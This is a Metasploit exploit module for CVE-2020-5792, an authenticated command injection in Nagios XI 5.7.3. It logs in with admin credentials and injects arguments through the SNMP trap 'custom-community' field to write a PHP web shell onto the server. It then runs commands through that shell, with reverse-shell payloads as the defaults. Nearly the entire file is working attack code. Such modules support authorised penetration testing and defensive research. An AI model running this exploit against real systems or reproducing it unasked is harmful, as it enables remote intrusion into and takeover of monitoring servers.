##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::NagiosXi
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Nagios XI 5.7.3 - Snmptrap Authenticated Remote Code Exection',
        'Description' => %q{
          This module exploits an OS command injection vulnerability in
          `includes/components/nxti/index.php` that enables an authenticated user
          with admin privileges to achieve remote code execution as the `apache`
          user. The module uploads a simple PHP shell to the vulnerable location,
          and then executes the payload via an HTTP GET request to
          `includes/components/autodiscovery/jobs/<php_shell>?<php_param>=<cmd>`

          Valid credentials for a Nagios XI admin user are required. This module has
          been successfully tested against Nagios XI 5.7.3 running on CentOS 7.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Chris Lyne', # discovery
            'Erik Wynter' # @wyntererik - Metasploit'
          ],
        'References' =>
          [
            ['CVE', '2020-5792']
          ],
        'Platform' => %w[linux unix php],
        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_CMD ],
        'Targets' =>
          [
            [
              'Linux', {
                'Arch' => [ARCH_X86, ARCH_X64],
                'Platform' => 'linux',
                'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }
              }
            ],
            [
              'CMD', {
                'Arch' => [ARCH_CMD],
                'Platform' => 'unix',
                # cmd/unix/reverse_awk is one of the few reliable CMD payloads for a typical NagiosXI install (CentOS 7 minimal).
                # other options are cmd/unix/reverse_perl_ssl and cmd/unix/reverse_openssl
                'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_awk' }
              }
            ],
          ],
        'Privileged' => false,
        'DisclosureDate' => '2020-10-20',
        'DefaultTarget' => 0
      )
    )

    register_options [
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', nil])
    ]
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def check
    # obtain cookies required for authentication
    cookies = nagios_xi_login(username, password)
    if cookies.instance_of? Msf::Exploit::CheckCode
      return cookies
    end

    # authenticate and obtain the Nagios XI version
    print_good('Successfully authenticated to Nagios XI')
    version = nagios_xi_version_index(cookies)
    if version.instance_of? Msf::Exploit::CheckCode
      return version
    end

    print_status("Target is Nagios XI with version #{version}")

    # check if the target is actually vulnerable
    unless version == '5.7.3'
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Appears
  end

  def print_message(payload_string)
    payload_execution = "#{normalize_uri(target_uri.path, 'includes', 'components', 'autodiscovery', 'jobs', @php_log_file)}?#{@php_param}=<cmd>"
    print_status("Attempting to execute the #{payload_string} via `#{payload_execution}`")
  end

  def upload_php_shell
    # prepare the variables we need
    @php_param = rand_text_alpha(1) # this does not work with longer parameters
    php_shell = "<?php /*      */system(/*     */$_GET[\"#{@php_param}\"])/* */?>"
    encoded_payload = Rex::Text.to_hex(php_shell)
    encoded_payload.gsub!('\x', '') # get clean hex without the \x format
    @php_log_file = "#{rand_text_alpha(8..12)}.php"
    php_log_file_path = "/usr/local/nagiosxi/html/includes/components/autodiscovery/jobs/#{@php_log_file}"
    register_file_for_cleanup(php_log_file_path)

    # upload the shell
    print_status("Uploading a simple PHP shell to #{php_log_file_path}")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'includes', 'components', 'nxti', 'index.php'),
      'vars_get' =>
      {
        'custom-version' => '2c',
        'generic-trap-option' => '0',
        'specific-trap-option' => '',
        'custom-agent' => '',
        'custom-community' => "a -d -L f #{php_log_file_path}",
        'custom-oid' => 'NET-SNMP-EXAMPLES-MIB::netSnmpExampleHeartbeatNotification',
        'variablebindings[name][]' => 'x',
        'variablebindings[type][]' => 'x',
        'variablebindings[value][]' => encoded_payload,
        'mode' => 'customTrap'
      }
    })

    unless res
      fail_with(Failure::Disconnected, 'Connection failed while trying to upload the PHP shell')
    end

    unless res.code == 200 && res.body.include?('var message = "Custom trap sent successfully!";')
      fail_with(Failure::UnexpectedReply, 'Unexpected response received while trying to upload the PHP shell')
    end
  end

  def execute_command(cmd, _opts = {})
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'includes', 'components', 'autodiscovery', 'jobs', @php_log_file),
      'vars_get' => { @php_param => cmd }
    }, 0) # don't wait for a response from the target, otherwise the module will hang for a few seconds after executing the payload
  end

  def exploit
    upload_php_shell # upload a simple php shell that will be used to execute the payload
    if target.arch.first == ARCH_CMD
      print_message('payload')
      execute_command(payload.encoded)
    else
      print_message('initial payload')
      execute_cmdstager(background: true)
    end
  end
end
